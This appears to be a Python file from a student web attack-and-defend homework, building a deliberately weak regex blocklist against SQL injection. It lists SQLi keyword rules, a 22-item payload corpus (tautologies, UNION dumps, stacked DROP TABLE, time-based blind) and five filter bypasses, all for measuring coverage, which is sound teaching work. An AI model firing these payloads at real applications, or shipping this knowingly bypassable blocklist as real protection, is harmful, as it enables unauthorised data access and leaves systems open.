# HW2 — Web Attack & Defend — Part B1 engine — Team: Gabriel Avalos, Keoma Quiroga, David Bucheli
"""The NEGATIVE security model: a blocklist WAF for the SQLi sink.

A typical "SQL-injection keyword" blocklist, the kind teams actually deploy in
front of a login/search box. Two design decisions ARE the lesson of B1:

  * It blocks SQL keywords/operators by WORD (``\\bor\\b``, union, select, drop,
    the ``--`` comment, the ``1=1`` tautology), case-insensitively — stronger than
    the case-sensitive DVWA-Medium filter of Part A.
  * It deliberately does NOT block the apostrophe, because real usernames contain
    one (O'Brien, D'Angelo). Blocking ``'`` would be safer against SQLi but would
    reject real people — and that is exactly the false-positive cost (axis 5), and
    why the quote survives for the bypasses to use.

The word boundaries are what let legitimate usernames through (``select_committee``
has no ``\\b`` after "select" because ``_`` is a word char) while attack-adjacent
free text in the search box ("select the union option") still trips — so the FP
rate depends on WHICH field you measure, a point ``defend/defend.py`` reports in
full and ``honesty.md`` discusses.

A blocklist can only ever enumerate the bad it already imagined. The bypasses in
``defend/defend.py`` leak the same canary with block-comment neutralization, GLOB
wildcards and inequality tautologies — none of which these rules name.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

RULES = [
    ("boolean-or",     re.compile(r"\bor\b", re.I)),
    ("union",          re.compile(r"\bunion\b", re.I)),
    ("select",         re.compile(r"\bselect\b", re.I)),
    ("drop",           re.compile(r"\bdrop\b", re.I)),
    ("inline-comment", re.compile(r"--")),
    ("tautology-1eq1", re.compile(r"1\s*=\s*1")),
]


@dataclass
class Verdict:
    blocked: bool
    value: str
    reason: str = ""


def first_rule_hit(value: str) -> str | None:
    for name, pat in RULES:
        if pat.search(value):
            return name
    return None


def screen(kind: str, value: str) -> Verdict:
    # This WAF defends the SQLi sink; other kinds pass through unchanged.
    if kind == "sqli":
        name = first_rule_hit(value)
        if name:
            return Verdict(blocked=True, value=value, reason=name)
    return Verdict(blocked=False, value=value)


class _WAF:
    screen = staticmethod(screen)


WAF = _WAF()

# The Part-A SQLi payloads the WAF was written against.
KNOWN_SQLI = [
    "admin' or '1'='1",            # Part-A baseline
    "admin' OR '1'='1",            # Part-A case bypass (of the Medium filter)
    "admin'/**/Or/**/'1'='1",      # Part-A comment+case bypass
    "admin'/**/-- -",              # Part-A inline-comment bypass
]

# Axis-3 COVERAGE CORPUS — the Control Scorecard requires coverage to be measured
# on >= 20 DISTINCT payloads (resources/control-scorecard.md, axis 3: "payloads
# blocked / payloads attempted, on >= 20 distinct payloads"). This is a realistic
# cross-section of the SQLi class (tautologies, UNION, stacked DROP, comment, blind,
# order-by), NOT just the four it was written against. A blocklist can only block
# the shapes it imagined, so the misses here are honest — and they foreshadow the
# Part-B4 bypasses (quoted equality, GLOB, LIKE, inequality are all present and all
# slip through). The 4 Part-A payloads above are a subset of this class.
COVERAGE_CORPUS = [
    "admin' OR '1'='1",                              # 1  quoted OR tautology
    "admin' OR 1=1--",                               # 2  classic numeric tautology
    "' OR 'x'='x",                                   # 3  bare quoted tautology
    "admin'--",                                      # 4  comment-out password
    "admin' #",                                      # 5  '#' comment (rules don't name it)
    "' UNION SELECT NULL,NULL--",                    # 6  UNION probe
    "' UNION SELECT user,secret FROM users--",       # 7  UNION data dump
    "1' ORDER BY 2--",                               # 8  column enumeration
    "'; DROP TABLE users--",                         # 9  stacked DROP
    "' OR 1=1 LIMIT 1--",                            # 10 tautology + LIMIT
    "admin'/**/OR/**/'1'='1",                        # 11 inline-comment around OR
    "admin' || '1'='1",                              # 12 '||' OR-operator (no 'or' word)
    "' AND 1=1--",                                   # 13 boolean AND probe (true)
    "' AND SLEEP(5)--",                              # 14 time-based blind
    "' OR SLEEP(5) #",                               # 15 time-based with OR
    "1 OR 1=1",                                       # 16 numeric context tautology
    "') OR ('1'='1",                                 # 17 parenthesis break-out
    "' OR EXISTS(SELECT 1 FROM users)--",            # 18 subquery existence
    "admin' AND '1'='1",                             # 19 quoted equality (no OR, no 1=1)
    "admin' AND pw LIKE '%",                          # 20 LIKE wildcard tautology
    "admin' AND pw GLOB '*",                          # 21 GLOB wildcard tautology
    "x' oR '1'='1",                                  # 22 mixed-case OR
]

# Candidate SAME-INTENT bypasses of THIS WAF (auth bypass / canary leak). The
# "<user> :: <pw>" encoding lets a /* block comment opened in `user` close in `pw`,
# swallowing the " ' AND pw = ' " the app concatenates between them. The script
# keeps only the candidates that (a) the WAF passes AND (b) really leak the canary
# on the live sink — an oracle-filtered set, not a wishlist. None contains a word
# the rules name (or/union/select/drop/--/1=1).
CANDIDATE_BYPASSES = [
    ("admin'/* :: */ AND '1'='1",          "block-comment neutralization + quoted tautology"),
    ("admin'/* :: */ AND pw GLOB '*",       "block-comment + GLOB wildcard (no '=')"),
    ("admin'/* :: */ AND 2>1 AND 'a'<'z",   "block-comment + inequality tautology"),
    ("admin'/* :: */ AND 'a'='a",           "block-comment + quoted equality (no OR keyword)"),
    ("admin'/* :: */ AND pw LIKE '%",       "block-comment + LIKE wildcard"),
]
